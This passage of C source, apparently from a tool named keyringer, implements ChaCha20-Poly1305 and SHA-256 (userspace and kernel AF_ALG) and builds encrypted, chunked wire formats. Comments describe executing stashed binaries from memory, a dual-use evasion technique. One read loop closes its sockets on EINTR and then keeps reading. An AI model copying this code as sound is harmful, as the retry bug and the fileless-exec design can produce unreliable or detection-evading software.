             (uint64_t)h[2] * r[0] + (uint64_t)h[3] * (r[4] * 5) +
             (uint64_t)h[4] * (r[3] * 5);
        d3 = (uint64_t)h[0] * r[3] + (uint64_t)h[1] * r[2] +
             (uint64_t)h[2] * r[1] + (uint64_t)h[3] * r[0] +
             (uint64_t)h[4] * (r[4] * 5);
        d4 = (uint64_t)h[0] * r[4] + (uint64_t)h[1] * r[3] +
             (uint64_t)h[2] * r[2] + (uint64_t)h[3] * r[1] +
             (uint64_t)h[4] * r[0];
        cc = d0 >> 26; h[0] = (uint32_t)d0 & 0x3ffffff;
        d1 += cc; cc = d1 >> 26; h[1] = (uint32_t)d1 & 0x3ffffff;
        d2 += cc; cc = d2 >> 26; h[2] = (uint32_t)d2 & 0x3ffffff;
        d3 += cc; cc = d3 >> 26; h[3] = (uint32_t)d3 & 0x3ffffff;
        d4 += cc; cc = d4 >> 26; h[4] = (uint32_t)d4 & 0x3ffffff;
        h[0] += (uint32_t)cc * 5; cc = h[0] >> 26; h[0] &= 0x3ffffff;
        h[1] += (uint32_t)cc;
    }

    /* fully carry h */
    {
        uint32_t cc = h[1] >> 26;

        h[1] &= 0x3ffffff;
        h[2] += cc; cc = h[2] >> 26; h[2] &= 0x3ffffff;
        h[3] += cc; cc = h[3] >> 26; h[3] &= 0x3ffffff;
        h[4] += cc; cc = h[4] >> 26; h[4] &= 0x3ffffff;
        h[0] += cc * 5; cc = h[0] >> 26; h[0] &= 0x3ffffff;
        h[1] += cc;
    }

    /* compute h + -p; select h if h < p, else h + -p */
    {
        uint32_t g0, g1, g2, g3, g4, cc, mask;

        g0 = h[0] + 5; cc = g0 >> 26; g0 &= 0x3ffffff;
        g1 = h[1] + cc; cc = g1 >> 26; g1 &= 0x3ffffff;
        g2 = h[2] + cc; cc = g2 >> 26; g2 &= 0x3ffffff;
        g3 = h[3] + cc; cc = g3 >> 26; g3 &= 0x3ffffff;
        g4 = h[4] + cc - (1UL << 26);
        mask = (g4 >> 31) - 1;            /* all-ones if g4 did NOT underflow */
        g0 &= mask; g1 &= mask; g2 &= mask; g3 &= mask; g4 &= mask;
        mask = ~mask;
        h[0] = (h[0] & mask) | g0;
        h[1] = (h[1] & mask) | g1;
        h[2] = (h[2] & mask) | g2;
        h[3] = (h[3] & mask) | g3;
        h[4] = (h[4] & mask) | g4;

        /* h = h mod 2^128, + pad, out */
        uint32_t f0 = ((h[0]      ) | (h[1] << 26));
        uint32_t f1 = ((h[1] >>  6) | (h[2] << 20));
        uint32_t f2 = ((h[2] >> 12) | (h[3] << 14));
        uint32_t f3 = ((h[3] >> 18) | (h[4] <<  8));
        uint64_t t;

        t = (uint64_t)f0 + pad[0];          f0 = (uint32_t)t;
        t = (uint64_t)f1 + pad[1] + (t >> 32); f1 = (uint32_t)t;
        t = (uint64_t)f2 + pad[2] + (t >> 32); f2 = (uint32_t)t;
        t = (uint64_t)f3 + pad[3] + (t >> 32); f3 = (uint32_t)t;
        kr_le32enc(tag,      f0);
        kr_le32enc(tag + 4,  f1);
        kr_le32enc(tag + 8,  f2);
        kr_le32enc(tag + 12, f3);
    }
}

/*
 * Userspace RFC 8439 AEAD, same wire behavior as aead_op()'s kernel path:
 * encrypt out = aad||ct||tag (16), decrypt out = aad||pt; decrypt fails
 * (EBADMSG-style) on tag mismatch.
 */
static int aead_ref_op(int decrypt, const uint8_t key[32],
                       const uint8_t *aad, size_t aadlen,
                       const uint8_t *in, size_t inlen,
                       const uint8_t nonce[KR_NONCE_LEN],
                       uint8_t *out, char *err)
{
    uint8_t polykey[64], mac[16];
    size_t ctlen = decrypt ? inlen - KR_TAG_LEN : inlen;
    const uint8_t *ct = decrypt ? in : NULL;
    uint8_t *ctbuf = NULL;

    /* same output contract as the AF_ALG path: the AAD is echoed first */
    memcpy(out, aad, aadlen);
    kr_chacha20_block(key, 0, nonce, polykey);   /* block 0 = poly key */
    if (decrypt) {
        uint8_t calc[16];

        ctbuf = malloc(ctlen ? ctlen : 1);
        if (!ctbuf)
            return seterr(err, "out of memory");
        memcpy(ctbuf, in, ctlen);
        {
            size_t aadpad = (16 - aadlen % 16) % 16;
            size_t ctpad  = (16 - ctlen % 16) % 16;
            /* mac input: aad || pad16 || ct || pad16 || le64(aadlen) || le64(ctlen) */
            uint8_t *macdata = malloc(aadlen + aadpad + ctlen + ctpad + 16);

            if (!macdata) {
                free(ctbuf);
                return seterr(err, "out of memory");
            }
            memcpy(macdata, aad, aadlen);
            memset(macdata + aadlen, 0, aadpad);
            memcpy(macdata + aadlen + aadpad, ct, ctlen);
            memset(macdata + aadlen + aadpad + ctlen, 0, ctpad);
            kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad,
                       (uint32_t)aadlen);
            kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad + 4, 0);
            kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad + 8,
                       (uint32_t)ctlen);
            kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad + 12, 0);
            kr_poly1305_mac(polykey, macdata,
                            aadlen + aadpad + ctlen + ctpad + 16, calc);
            free(macdata);
        }
        if (memcmp(calc, in + ctlen, 16) != 0) {
            free(ctbuf);
            return seterr(err, "AEAD authentication failed (wrong key or "
                          "corrupted data)");
        }
    }
    /* xor the message: block 0 is the Poly1305 key, data starts at 1 */
    {
        size_t off;
        uint8_t ks[64];

        for (off = 0; off < ctlen; off += 64) {
            uint32_t ctr = 1 + (uint32_t)(off / 64);
            size_t i, take = ctlen - off < 64 ? ctlen - off : 64;

            kr_chacha20_block(key, ctr, nonce, ks);
            for (i = 0; i < take; i++) {
                if (decrypt)
                    out[aadlen + off + i] = ct[off + i] ^ ks[i];
                else
                    out[aadlen + off + i] = in[off + i] ^ ks[i];
            }
        }
    }
    if (!decrypt) {
        size_t aadpad = (16 - aadlen % 16) % 16;
        size_t ctpad  = (16 - ctlen % 16) % 16;
        uint8_t *macdata = malloc(aadlen + aadpad + ctlen + ctpad + 16);

        if (!macdata)
            return seterr(err, "out of memory");
        memcpy(macdata, aad, aadlen);
        memset(macdata + aadlen, 0, aadpad);
        memcpy(macdata + aadlen + aadpad, out + aadlen, ctlen);
        memset(macdata + aadlen + aadpad + ctlen, 0, ctpad);
        kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad,
                   (uint32_t)aadlen);
        kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad + 4, 0);
        kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad + 8,
                   (uint32_t)ctlen);
        kr_le32enc(macdata + aadlen + aadpad + ctlen + ctpad + 12, 0);
        kr_poly1305_mac(polykey, macdata,
                        aadlen + aadpad + ctlen + ctpad + 16, mac);
        free(macdata);
        memcpy(out + aadlen + ctlen, mac, 16);
    }
    free(ctbuf);
    return 0;
}

/* ---- crypto selection: AF_ALG preferred, userspace fallback ------------- */

/* forward decls: the AF_ALG paths live below the reference impls */
static int aead_op(int decrypt, const uint8_t key[32],
                   const uint8_t *aad, size_t aadlen,
                   const uint8_t *in, size_t inlen,
                   const uint8_t nonce[KR_NONCE_LEN],
                   uint8_t *out, char *err);
static int sha256_afalg(const uint8_t *data, size_t len, uint8_t out[32],
                        char *err);

static int kr_crypto_force_ref(void)   /* KR_CRYPTO=userspace override */
{
    const char *m = getenv("KR_CRYPTO");

    return m && strcmp(m, "userspace") == 0;
}

static void kr_sha256(const uint8_t *data, size_t len, uint8_t out[32],
                      char *err)
{
    if (!kr_crypto_force_ref() &&
        sha256_afalg(data, len, out, err) == 0)
        return;
    sha256_ref(data, len, out);
    err[0] = '\0';
}

static int kr_aead(int decrypt, const uint8_t key[32],
                   const uint8_t *aad, size_t aadlen,
                   const uint8_t *in, size_t inlen,
                   const uint8_t nonce[KR_NONCE_LEN],
                   uint8_t *out, char *err)
{
    if (!kr_crypto_force_ref())
        return aead_op(decrypt, key, aad, aadlen, in, inlen, nonce, out, err);
    return aead_ref_op(decrypt, key, aad, aadlen, in, inlen, nonce, out, err);
}

/* ===================================================================== */
/* ChaCha20-Poly1305 (RFC 8439) via AF_ALG                                */
/* ===================================================================== */

/*
 * One AEAD operation over an accepted AF_ALG socket.
 *
 * kernel protocol (verified empirically against RFC 8439 section
 * 2.8.2 on this box):
 *   - bind(("aead", "rfc7539(chacha20,poly1305)")); ALG_SET_KEY (32B);
 *     ALG_SET_AEAD_AUTHSIZE (16). (plain "chacha20poly1305" does not
 *     resolve on this kernel; rfc7539 here uses ivsize 12 / salt 0 and
 *     implements the RFC 8439 construction directly, so the 12-byte
 *     nonce goes in as-is.)
 *   - per op: accept(); cmsgs ALG_SET_OP, ALG_SET_IV (ivlen 12),
 *     ALG_SET_AEAD_ASSOCLEN.
 *   - data: one sendmsg of AAD||plaintext (encrypt) or AAD||ct||tag
 *     (decrypt).
 *   - output is AAD||ct||tag (encrypt) or AAD||pt (decrypt); the read
 *     buffer must be sized aadlen + datalen (+tag for encrypt) or the
 *     kernel silently truncates the operation to fit it.
 *   - bad tag => read() fails with EBADMSG.
 */
static int aead_op(int decrypt, const uint8_t key[32],
                   const uint8_t *aad, size_t aadlen,
                   const uint8_t *in, size_t inlen,   /* pt (enc) | ct||tag (dec) */
                   const uint8_t nonce[KR_NONCE_LEN],
                   uint8_t *out,                      /* aad||ct||tag | aad||pt   */
                   char *err)
{
    int tfm = socket(AF_ALG, SOCK_SEQPACKET, 0);

    if (tfm < 0) {
        int e = errno;

        return seterr(err, "AEAD: socket(AF_ALG) failed: %s (kernel missing "
                      "CONFIG_CRYPTO_USER_API / CONFIG_CRYPTO_USER_API_AEAD)",
                      strerror(e));
    }

    struct sockaddr_alg sa;

    memset(&sa, 0, sizeof sa);
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "rfc7539(chacha20,poly1305)");
    if (bind(tfm, (struct sockaddr *)&sa, sizeof sa) != 0) {
        int e = errno;

        close(tfm);
        return seterr(err, "AEAD: cannot bind \"aead\"/"
                      "\"rfc7539(chacha20,poly1305)\" via AF_ALG: %s (kernel "
                      "missing CONFIG_CRYPTO_CHACHA20POLY1305 or "
                      "CONFIG_CRYPTO_USER_API_AEAD)", strerror(e));
    }
    if (setsockopt(tfm, SOL_ALG, ALG_SET_KEY, key, 32) != 0) {
        int e = errno;

        close(tfm);
        return seterr(err, "AEAD: ALG_SET_KEY failed: %s", strerror(e));
    }
    if (setsockopt(tfm, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, KR_TAG_LEN) != 0) {
        int e = errno;

        close(tfm);
        return seterr(err, "AEAD: ALG_SET_AEAD_AUTHSIZE failed: %s", strerror(e));
    }

    int op = accept(tfm, NULL, 0);

    if (op < 0) {
        int e = errno;

        close(tfm);
        return seterr(err, "AEAD: accept(AF_ALG) failed: %s", strerror(e));
    }

    /* control messages: op, IV, assoclen */
    char cbuf[CMSG_SPACE(sizeof(uint32_t)) +
              CMSG_SPACE(sizeof(struct af_alg_iv) + KR_NONCE_LEN) +
              CMSG_SPACE(sizeof(uint32_t))];

    memset(cbuf, 0, sizeof cbuf);
    struct msghdr hm;

    memset(&hm, 0, sizeof hm);
    hm.msg_control = cbuf;
    hm.msg_controllen = sizeof cbuf;
    struct cmsghdr *cm = CMSG_FIRSTHDR(&hm);

    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_OP;
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    uint32_t opv = decrypt ? ALG_OP_DECRYPT : ALG_OP_ENCRYPT;

    memcpy(CMSG_DATA(cm), &opv, sizeof opv);
    cm = CMSG_NXTHDR(&hm, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_IV;
    cm->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + KR_NONCE_LEN);
    struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(cm);

    aiv->ivlen = KR_NONCE_LEN;
    memcpy(aiv->iv, nonce, KR_NONCE_LEN);
    cm = CMSG_NXTHDR(&hm, cm);
    cm->cmsg_level = SOL_ALG;
    cm->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cm->cmsg_len = CMSG_LEN(sizeof(uint32_t));
    uint32_t assoc = (uint32_t)aadlen;

    memcpy(CMSG_DATA(cm), &assoc, sizeof assoc);

    /* data: AAD first, then plaintext/ciphertext — possibly split sends */
    int have_ctrl = 1;
    size_t total = aadlen + inlen, sent = 0;

    while (sent < total) {
        struct iovec iov[2];
        int n = 0;
        struct msghdr m;

        if (sent < aadlen) {
            iov[n].iov_base = (void *)(aad + sent);
            iov[n].iov_len = aadlen - sent;
            n++;
        }
        size_t dsent = sent > aadlen ? sent - aadlen : 0;

        if (dsent < inlen) {
            iov[n].iov_base = (void *)(in + dsent);
            iov[n].iov_len = inlen - dsent;
            n++;
        }
        memset(&m, 0, sizeof m);
        if (have_ctrl) {
            m.msg_control = cbuf;
            m.msg_controllen = sizeof cbuf;
        }
        m.msg_iov = iov;
        m.msg_iovlen = n;
        ssize_t r = sendmsg(op, &m, MSG_NOSIGNAL);

        if (r < 0) {
            if (errno == EINTR)
                continue;
            int e = errno;

            close(op);
            close(tfm);
            return seterr(err, "AEAD: sendmsg: %s", strerror(e));
        }
        sent += (size_t)r;
        have_ctrl = 0;
    }

    /* collect output; the AAD is echoed at the front */
    size_t want = decrypt ? aadlen + inlen - KR_TAG_LEN
                          : aadlen + inlen + KR_TAG_LEN;
    size_t got = 0;

    while (got < want) {
        ssize_t r = read(op, out + got, want - got);

        if (r < 0) {
            int e = errno;

            close(op);
            close(tfm);
            if (e == EINTR)
                continue;
            if (e == EBADMSG)
                return seterr(err, "AEAD authentication failed (wrong key or "
                              "corrupted data)");
            return seterr(err, "AEAD: read: %s", strerror(e));
        }
        if (r == 0)
            break;
        got += (size_t)r;
    }
    close(op);
    close(tfm);
    if (got != want)
        return seterr(err, "AEAD: short read (%zu of %zu bytes)", got, want);
    return 0;
}

/*
 * SHA-256 through the kernel's AF_ALG userspace interface: socket +
 * bind(("hash", "sha256")), accept(), write the data, read 32 bytes.
 * Used for the wire-v2 integrity digest.
 */
static int sha256_afalg(const uint8_t *data, size_t len, uint8_t out[32],
                        char *err)
{
    int tfm = socket(AF_ALG, SOCK_SEQPACKET, 0);

    if (tfm < 0) {
        int e = errno;

        return seterr(err, "digest: socket(AF_ALG) failed: %s (kernel missing "
                      "CONFIG_CRYPTO_USER_API / CONFIG_CRYPTO_USER_API_HASH)",
                      strerror(e));
    }

    struct sockaddr_alg sa;

    memset(&sa, 0, sizeof sa);
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "hash");
    strcpy((char *)sa.salg_name, "sha256");
    if (bind(tfm, (struct sockaddr *)&sa, sizeof sa) != 0) {
        int e = errno;

        close(tfm);
        return seterr(err, "digest: cannot bind \"hash\"/\"sha256\" via "
                      "AF_ALG: %s (kernel missing CONFIG_CRYPTO_SHA256 or "
                      "CONFIG_CRYPTO_USER_API_HASH)", strerror(e));
    }

    int op = accept(tfm, NULL, 0);

    if (op < 0) {
        int e = errno;

        close(tfm);
        return seterr(err, "digest: accept(AF_ALG) failed: %s", strerror(e));
    }

    size_t sent = 0;

    while (sent < len) {
        ssize_t r = write(op, data + sent, len - sent);

        if (r < 0) {
            if (errno == EINTR)
                continue;
            int e = errno;

            close(op);
            close(tfm);
            return seterr(err, "digest: sha256 write: %s", strerror(e));
        }
        sent += (size_t)r;
    }

    size_t got = 0;

    while (got < 32) {
        ssize_t r = read(op, out + got, 32 - got);

        if (r < 0) {
            if (errno == EINTR)
                continue;
            int e = errno;

            close(op);
            close(tfm);
            return seterr(err, "digest: sha256 read: %s", strerror(e));
        }
        if (r == 0)
            break;
        got += (size_t)r;
    }
    close(op);
    close(tfm);
    if (got != 32)
        return seterr(err, "digest: sha256 short read (%zu of 32 bytes)", got);
    return 0;
}

static int envelope_open(const uint8_t key[32], const uint8_t *env, size_t n,
                         uint8_t **out, size_t *outlen, char *err)
{
    if (n < KR_ENV_OVERHEAD || memcmp(env, KR_MAGIC, 3) != 0)
        return seterr(err, "load: not a KR1 encrypted envelope (bad magic or "
                      "size) — was the stash made with --key?");

    size_t datalen = n - KR_ENV_OVERHEAD;
    uint8_t *scratch = malloc(KR_AAD_LEN + datalen);
    uint8_t *pt = malloc(datalen ? datalen : 1);

    if (!scratch || !pt) {
        free(scratch);
        free(pt);
        return seterr(err, "out of memory");
    }
    if (aead_op(1, key, env, KR_AAD_LEN, env + KR_AAD_LEN,
                n - KR_AAD_LEN, env + 3, scratch, err) != 0) {
        volatile_wipe(scratch, KR_AAD_LEN + datalen);
        free(scratch);
        volatile_wipe(pt, datalen ? datalen : 1);
        free(pt);
        return -1;
    }
    memcpy(pt, scratch + KR_AAD_LEN, datalen);
    volatile_wipe(scratch, KR_AAD_LEN + datalen);
    free(scratch);
    *out = pt;
    *outlen = datalen;
    return 0;
}

/*
 * KR1 envelope: "KR1" + 12B nonce + ct||tag, AAD = the leading 15
 * bytes. Wire overhead is 31 bytes. (build_v2_wire() is the stash-time
 * wrapper that adds the KRH1 digest header; this bare primitive is kept
 * for the selftest's envelope roundtrip.)
 */
static int envelope_seal(const uint8_t key[32], const uint8_t *pt, size_t n,
                         uint8_t **out, size_t *outlen, char *err)
{
    size_t total = KR_ENV_OVERHEAD + n;
    uint8_t *env = malloc(total);

    if (!env)
        return seterr(err, "out of memory");
    memcpy(env, KR_MAGIC, 3);
    if (kr_random(env + 3, KR_NONCE_LEN) != 0) {
        volatile_wipe(env, total);
        free(env);
        return seterr(err, "selftest: cannot obtain randomness for the nonce");
    }
    if (aead_op(0, key, env, KR_AAD_LEN, pt, n, env + 3, env, err) != 0) {
        volatile_wipe(env, total);
        free(env);
        return -1;
    }
    *out = env;
    *outlen = total;
    return 0;
}

/*
 * Build the wire-v2 payload that gets chunked: KRH1 header (magic +
 * u32 LE flags + SHA-256 of the plaintext) || body, where the body is
 * either the plaintext (key32 == NULL) or a fresh KR1 envelope sealed
 * around it (roundtrip-verified BEFORE the caller stores anything).
 * *out is a malloc'd wire buffer of 40 + (n [+ 31]) bytes.
 */
static int build_v2_wire(const uint8_t *key32, const uint8_t *pt, size_t n,
                         uint8_t **out, size_t *outlen, char *err)
{
    size_t bodylen = n + (key32 ? KR_ENV_OVERHEAD : 0);
    size_t wirelen = KR_HDR_LEN + bodylen;
    uint8_t *wire = malloc(wirelen);

    if (!wire)
        return seterr(err, "out of memory");

    uint32_t flags = key32 ? KR_HDR_FLAG_ENC : 0;

    memcpy(wire, KR_WIRE_MAGIC, 4);
    wire[4] = (uint8_t)flags;
    wire[5] = (uint8_t)(flags >> 8);
    wire[6] = (uint8_t)(flags >> 16);
    wire[7] = (uint8_t)(flags >> 24);
    if (sha256_afalg(pt, n, wire + 8, err) != 0) {
        free(wire);
        return -1;
    }

    if (key32) {
        uint8_t *body = wire + KR_HDR_LEN;

        memcpy(body, KR_MAGIC, 3);
        if (kr_random(body + 3, KR_NONCE_LEN) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "stash: cannot obtain randomness for the nonce");
        }
        if (aead_op(0, key32, body, KR_AAD_LEN, pt, n, body + 3, body, err) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return -1;
        }

        /*
         * Verify the seal with a decrypt roundtrip BEFORE any chunk is
         * stored; on mismatch nothing was stored, so there is nothing
         * to revoke.
         */
        uint8_t *back = NULL;
        size_t backlen = 0;

        if (envelope_open(key32, body, bodylen, &back, &backlen, err) != 0 ||
            backlen != n || memcmp(back, pt, n) != 0) {
            if (back) {
                volatile_wipe(back, backlen);
                free(back);
            }
            volatile_wipe(wire, wirelen);
            free(wire);
            if (err && !*err)
                seterr(err, "stash: encrypt/decrypt roundtrip mismatch");
            return -1;
        }
        volatile_wipe(back, backlen);
        free(back);
        kr_logf("stash: sealed KR1 envelope, %zu -> %zu bytes "
                "(ChaCha20-Poly1305, +%d bytes overhead) plus %lu-byte "
                "KRH1 digest header", n, bodylen, KR_ENV_OVERHEAD,
                KR_HDR_LEN);
    } else {
        memcpy(wire + KR_HDR_LEN, pt, n);
    }

    *out = wire;
    *outlen = wirelen;
    return 0;
}

/*
 * Fuzz entry: run an untrusted buffer through the full wire-open path
 * (v3 → v2.2 → legacy, decrypt when keyhex given).  Used by
 * test/fuzz_wire.c; never executes anything, just parses.  Returns 0 or
 * -1 exactly like the loader would see.
 */
static int wire_open(const kr_opts *o, uint8_t *wire, size_t wirelen,
                     uint8_t **out, size_t *outlen, char *err);

int kr_wire_fuzz_entry(const uint8_t *wire, size_t wirelen,
                       const char *keyhex, char err[KR_ERRSZ])
{
    kr_opts o;

    memset(&o, 0, sizeof o);
    o.key_hex = keyhex;
    uint8_t *copy = malloc(wirelen ? wirelen : 1);

    if (!copy)
        return -1;
    memcpy(copy, wire, wirelen);
    uint8_t *pt = NULL;
    size_t ptlen = 0;
    int rc = wire_open(&o, copy, wirelen, &pt, &ptlen, err) == 0 ? 0 : -1;

    if (rc == 0) {                       /* discard the recovered plaintext */
        volatile_wipe(pt, ptlen);
        free(pt);
    }
    /* wire_open consumed (wiped+freed) the copy on every path */
    return rc;
}

/* ===================================================================== */
/* Wire v3 (KRH3): versioned header, structural AAD, HKDF subkeys         */
/* ===================================================================== */
/*
 * v3 wire = KRH3 header (56B) || body, where body is the plaintext or a
 * KR2 envelope.  Header: magic "KRH3"(4) version(1)=3 flags(1)
 * [bit0=encrypted] reserved(2)=0 SHA-256(plaintext)(32) stash-id(8)
 * u64 LE plaintext length(8).
 *
 * Encrypted body: "KR2" magic + 12B nonce + ct||tag, sealed with
 * key' = HKDF-SHA256(ikm=key, salt=stash-id, info="keyringer-v3", 32)
 * and AAD = the ENTIRE 56-byte header || "KR2" || nonce (71 bytes) —
 * the digest, length, stash-id and version are all authenticated, not
 * just the plaintext.  Overheads are identical to v2 (40→56 header,
 * 31-byte envelope).
 *
 * Reading accepts v3, v2 (KRH1) and the legacy headerless formats.
 * Writing is v4 by default (since core 4.0); KR_WIRE=3 selects this v3
 * builder and KR_WIRE=2 the v2.2 builder for downgrade/interop testing.
 */

/* stash-id bytes as two hex chars each, for logs */
static void stash_id_hex(const uint8_t id[KR_STASH_ID_LEN], char out[17])
{
    static const char hx[] = "0123456789abcdef";
    int i;

    for (i = 0; i < KR_STASH_ID_LEN; i++) {
        out[i * 2] = hx[id[i] >> 4];
        out[i * 2 + 1] = hx[id[i] & 0xf];
    }
    out[16] = '\0';
}

static int build_v3_wire(const uint8_t *key32, const uint8_t *pt, size_t n,
                         uint8_t **out, size_t *outlen, char *err)
{
    size_t bodylen = n + (key32 ? KR_ENV_OVERHEAD : 0);
    size_t wirelen = KR_HDR3_LEN + bodylen;
    uint8_t *wire = malloc(wirelen);
    uint8_t subkey[32], aad[KR_HDR3_LEN + 15];
    char idhex[17];

    if (!wire)
        return seterr(err, "out of memory");

    memcpy(wire, KR_WIRE3_MAGIC, 4);
    wire[4] = (uint8_t)KR_WIRE3_VERSION;
    wire[5] = key32 ? (uint8_t)KR_HDR3_FLAG_ENC : 0;
    wire[6] = 0;
    wire[7] = 0;
    kr_sha256(pt, n, wire + 8, err);
    if (kr_random(wire + 40, KR_STASH_ID_LEN) != 0) {
        volatile_wipe(wire, wirelen);
        free(wire);
        return seterr(err, "stash: cannot obtain randomness for the stash id");
    }
    for (int i = 0; i < 8; i++)
        wire[48 + i] = (uint8_t)(n >> (i * 8));

    if (key32) {
        uint8_t *body = wire + KR_HDR3_LEN;

        hkdf_sha256_ref(key32, 32, wire + 40, KR_STASH_ID_LEN,
                        (const uint8_t *)KR3_INFO, strlen(KR3_INFO),
                        subkey, 32);
        memcpy(body, KR_ENV2_MAGIC, 3);
        if (kr_random(body + 3, KR_NONCE_LEN) != 0) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "stash: cannot obtain randomness for the nonce");
        }
        memcpy(aad, wire, KR_HDR3_LEN);
        memcpy(aad + KR_HDR3_LEN, body, 15);       /* "KR2" || nonce */
        {
            /* kr_aead writes aad||ct||tag — seal into scratch, then copy
             * the ct||tag tail into the body */
            uint8_t *scratch = malloc(KR_HDR3_LEN + 15 + n + KR_TAG_LEN);

            if (!scratch) {
                volatile_wipe(wire, wirelen);
                free(wire);
                return seterr(err, "out of memory");
            }
            if (kr_aead(0, subkey, aad, sizeof aad, pt, n, body + 3,
                        scratch, err) != 0) {
                volatile_wipe(scratch, KR_HDR3_LEN + 15 + n + KR_TAG_LEN);
                free(scratch);
                volatile_wipe(wire, wirelen);
                free(wire);
                return -1;
            }
            memcpy(body + 15, scratch + KR_HDR3_LEN + 15, n + KR_TAG_LEN);
            volatile_wipe(scratch, KR_HDR3_LEN + 15 + n + KR_TAG_LEN);
            free(scratch);
        }
        /* roundtrip-verify the seal BEFORE anything is stored */
        {
            uint8_t *scratch = malloc(KR_HDR3_LEN + 15 + n);
            uint8_t *back = malloc(n ? n : 1);

            if (!scratch || !back) {
                free(scratch);
                free(back);
                volatile_wipe(wire, wirelen);
                free(wire);
                return seterr(err, "out of memory");
            }
            memcpy(scratch, aad, KR_HDR3_LEN + 15);
            if (kr_aead(1, subkey, scratch, KR_HDR3_LEN + 15,
                        body + 15, bodylen - 15, body + 3, scratch,
                        err) != 0 ||
                memcmp(scratch + KR_HDR3_LEN + 15, pt, n) != 0) {
                volatile_wipe(scratch, KR_HDR3_LEN + 15 + n);
                free(scratch);
                volatile_wipe(back, n);
                free(back);
                volatile_wipe(wire, wirelen);
                free(wire);
                if (err && !*err)
                    seterr(err, "stash: v3 encrypt/decrypt roundtrip mismatch");
                return -1;
            }
            volatile_wipe(scratch, KR_HDR3_LEN + 15 + n);
            free(scratch);
            volatile_wipe(back, n);
            free(back);
        }
        stash_id_hex(wire + 40, idhex);
        kr_logf("stash: sealed KR2 envelope, %zu -> %zu bytes (ChaCha20-"
                "Poly1305, HKDF subkey, stash-id %s, AAD-bound header) plus "
                "%lu-byte KRH3 header", n, bodylen, idhex, KR_HDR3_LEN);
    } else {
        memcpy(wire + KR_HDR3_LEN, pt, n);
        stash_id_hex(wire + 40, idhex);
        kr_logf("stash: KRH3 header (plaintext body, stash-id %s)", idhex);
    }

    *out = wire;
    *outlen = wirelen;
    return 0;
}

/*
 * Stash-time wire selector: what the KR_WIRE environment asks the writer
 * to build — 4 = v4, 3 = v3, 2 = v2.2. The final return is the DEFAULT
 * writer for an unset/unknown KR_WIRE: v4, since core 4.0 (KR_WIRE=4 is
 * an accepted no-op kept for pre-flip scripts).
 */
static int wire_sel(void)
{
    const char *m = getenv("KR_WIRE");

    if (m && strcmp(m, "4") == 0)
        return 4;
    if (m && m[0] == '2')
        return 2;
    if (m && strcmp(m, "3") == 0)
        return 3;
    return 4;
}

/*
 * The one stash-time entry point both eras share: v4 (KRH4, per-chunk
 * AEAD body) by default since core 4.0; KR_WIRE=3 opts back into the v3
 * builder and KR_WIRE=2 downgrades to v2.2 (both for downgrade/interop
 * testing). selfcontained != 0 (kr_stash's --selfcontained) downgrades
 * a v4 selection to the v3 builder: the exec side reassembles the
 * .ldso. interpreter wire through the buffer path and v4 ldso support
 * is still pending. An EXPLICIT KR_WIRE=4 + --selfcontained is refused
 * earlier in kr_stash; explicit KR_WIRE=2/3 are honored as given.
 */
static int build_v4_wire(const uint8_t *key32, const uint8_t *pt, size_t n,
                         uint8_t **out, size_t *outlen, char *err);
static int build_wire(const uint8_t *key32, const uint8_t *pt, size_t n,
                      uint8_t **out, size_t *outlen, int selfcontained,
                      char *err)
{
    int sel = wire_sel();

    if (sel == 4 && selfcontained)
        sel = 3;          /* v4 ldso support pending — see above */
    switch (sel) {
    case 2:
        return build_v2_wire(key32, pt, n, out, outlen, err);
    case 4:
        return build_v4_wire(key32, pt, n, out, outlen, err);
    default:
        return build_v3_wire(key32, pt, n, out, outlen, err);
    }
}

/* ===================================================================== */
/* Wire v4 (KRH4) — the DEFAULT writer since core 4.0 (KR_WIRE=3 opts     */
/* back to v3): per-chunk AEAD body + streaming exec                      */
/* ===================================================================== */
/*
 * v4 keeps the v3 56-byte header layout (magic "KRH4", version byte 4,
 * flags bit0 = body per-chunk sealed, digest = sha256 of the FULL
 * plaintext, 8-byte stash-id, u64 LE plaintext length) and changes the
 * encrypted body: the plaintext is split into pt-chunks of
 * KR_V4_PT_CHUNK (29900) bytes; chunk i is sealed as its own envelope
 *     nonce_i(12) || ct_i || tag_i(16)          (+28 B per piece)
 * with
 *     subkey_i = HKDF-SHA256(key, salt = stash-id(8) || u32le(i),
 *                            info = "keyringer-v4", 32)
 *     AAD      = header(56) || u32le(i) || u32le(total) || u32le(ptlen_i)
 * so every piece authenticates the header (digest, length, stash-id,
 * version), its own index and the chunk count — reordering, truncation,
 * splicing and header tampering all fail closed piece-locally.  The
 * header digest still covers the FULL plaintext and is verified after
 * reassembly (v4 exec streams it chunk-by-chunk into a running SHA-256 —
 * same bytes, no full buffer).
 *
 * Plaintext (flags=0) v4 body: header || raw plaintext, identical to v3.
 *
 * The defining second property — the exec path never materializes a
 * full plaintext buffer — lives in exec_v4_stream() below: only the
 * reassembled WIRE (ciphertext, unavoidable) and one scratch bounded by
 * KR_V4_PT_CHUNK + overhead ever exist; the mapped PT_LOADs become the
 * plaintext in place.
 */

/* TRUE only for an EXPLICIT KR_WIRE=4 (the implicit default is checked
 * with wire_sel() == 4 — post-flip both are v4, but --selfcontained
 * treats them differently: explicit refuses, implicit auto-downgrades) */
static int wire_v4_wanted(void)
{
    const char *m = getenv("KR_WIRE");

    return m && strcmp(m, "4") == 0;
}

/* HKDF salt for chunk i: stash-id(8) || u32 LE(i) */
